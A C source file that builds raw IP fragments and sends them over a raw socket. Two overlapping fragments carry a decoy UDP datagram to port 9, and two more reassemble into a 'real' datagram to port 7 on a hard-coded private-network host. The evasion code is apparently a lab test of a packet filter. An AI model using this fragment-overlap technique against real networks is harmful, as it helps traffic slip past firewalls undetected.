/*
 ============================================================================
 Name        : PacketFilterWrite.c
 Author      : lasko
 Version     :
 Copyright   : Your copyright notice
 Description : Hello World in C, Ansi-style
 ============================================================================
 *
 */

#include <sys/types.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <net/bpf.h>
#include <net/if.h>
#include <stdlib.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

char bpf_dev[] = "/dev/bpf0";   /* the BPF device to use */
char inter[] = "wm0";           /* the ethernet device we'll attach to */
char src[] = "10.20.3.131";      /* our address */
char dest[] = "10.20.3.130";     /* the target system's address */
int sport = 255;                /* the source port for the UDP datagram */
int dport = 9;                  /* the decoy destination port */
int real_dport = 7;             /* the real destination port */
int s; 							/* the socket im use */
union {
  unsigned long l[3];
  unsigned short s[6];
  unsigned char c[12];
} pseudo;


int blen;
u_char *bbuff;
struct ifreq req;
struct bpf_hdr *bhdr;

struct udphdr *udph;
struct ip *iph;
struct sockaddr_in daddr;
struct timeval to = {0, 500000};

unsigned char dgram[276]; //Datagram frame to send over ethernet.

void dump_hex(u_char *buffer, int size)
{
	int i, off = 0;
	while (off < size) {
		printf("%.4x:", off);
		for (i = 0; i < 16 && i + off < size; i++)
			printf(" %.2x", buffer[i + off]);
		printf("\n");
		off += i;
	}
}

int main(int argc, char *argv[]) {
	int bpf;
	int i, true = 1;
	
	printf("Starting program\n");
	
	  
	  if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
	    perror("socket");
	  } else {
	    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &true, sizeof(true)) < 0) {
	      perror("setsockopt");
	    } else if ((bpf = open(bpf_dev, O_RDWR)) < 0) {
	      perror("open");
	    } else {
	      if (ioctl(bpf, BIOCGBLEN, &blen) < 0) {
		perror("ioctl(BIOCGBLEN)");
		} else if ((bbuff = malloc(blen)) == NULL) {
		perror("malloc");
	    } else {
		strcpy(req.ifr_name, inter);
		if (ioctl(bpf, BIOCSETIF, &req) < 0) {
		  perror("ioctl(BIOSETIF)");
		} else if (ioctl(bpf, BIOCSRTIMEOUT, &to) < 0) {
		  perror("ioctl(BIOCSRTIMEOUT)");
		} else {
		  daddr.sin_len = sizeof(daddr);
		  daddr.sin_family = AF_INET;
		  daddr.sin_port = dport;
		  daddr.sin_addr.s_addr = inet_addr(dest);
	       
		  for (i = 0; i < sizeof(dgram); dgram[i++] = 27);
		  for (i = 0; i < 3; pseudo.l[i++] = 0);

		  iph = (struct ip *)&dgram[0];
		  udph = (struct udphdr *)&dgram[20];
		  printf("Print ip vers");
		  iph->ip_v = IPVERSION;
		  iph->ip_hl = 5;

		  iph->ip_len = 276;

		  iph->ip_id = 1;
		  iph->ip_ttl = 255;
		  iph->ip_p = pseudo.c[9] = IPPROTO_UDP;
		  iph->ip_src.s_addr = pseudo.l[0] = inet_addr(src);
		  iph->ip_dst.s_addr = pseudo.l[1] = inet_addr(dest);
	
		  iph->ip_off = 0x2000;

		  //iph->ip_sum = ~calc_sum(0, (u_short *)iph, 10);

		  udph->uh_sport = ntohs(sport);
		  udph->uh_dport = ntohs(dport);
		  udph->uh_ulen = pseudo.s[5] = ntohs(256);
//		  udph->uh_sum = ~calc_sum(calc_sum(0, pseudo.s, 6), (u_short *)udph,128);

		  /* send the first half of the decoy */

		  if (sendto(s, &dgram, 276, 0, (struct sockaddr *)&daddr,
			     sizeof(daddr)) < 0) {
		    perror("sendto");
		  }

		  iph->ip_off = 32;
		  iph->ip_sum = 0;
		//  iph->ip_sum = calc_sum(0, (u_short *)iph, 10);
		  for (i = 20; i < 276; dgram[i++] = 66);

		  /* send the second half of the decoy */

		  if (sendto(s, &dgram, 276, 0, (struct sockaddr *)&daddr,
			     sizeof(daddr)) < 0) {
		    perror("sendto");
		    
		  }

		  iph->ip_id++;
		  iph->ip_sum = 0;
		  //iph->ip_sum = ~calc_sum(0, (u_short *)iph, 10);

		  udph->uh_sport = ntohs(sport);
		  udph->uh_dport = ntohs(real_dport);
		  udph->uh_ulen = pseudo.s[5] = ntohs(256);
		  //udph->uh_sum = ~calc_sum(calc_sum(0, pseudo.s, 6), (u_short *)udph,128);

		  /*
		     send the first half of the real datagram
		     we have kept the offset settings from above
		     offset = 256, length = 256, MF = 0
		     -> total length is set to 512 by this fragment
		  */

		  if (sendto(s, &dgram, 276, 0, (struct sockaddr *)&daddr,
			     sizeof(daddr)) < 0) {
		    perror("sendto");
		  }

		  iph->ip_off = 0x2040;

		  iph->ip_sum = 0;
		  //iph->ip_sum = calc_sum(0, (u_short *)iph, 10);
		  for (i = 20; i < 276; dgram[i++] = 0);

		  /* send the second half of the real datagram */
 
		  if (sendto(s, &dgram, 276, 0, (struct sockaddr *)&daddr,
			     sizeof(daddr)) < 0) {
		    perror("sendto");
		  }
		  printf("Packet sendt\n");
		}

		
		free(bbuff);
	      }
	      close(bpf);
	    }
	    close(s);
	  }
      printf("--- Packet data ----\n");
	  dump_hex(dgram, sizeof(dgram));
	  
	return EXIT_SUCCESS;
}
	  
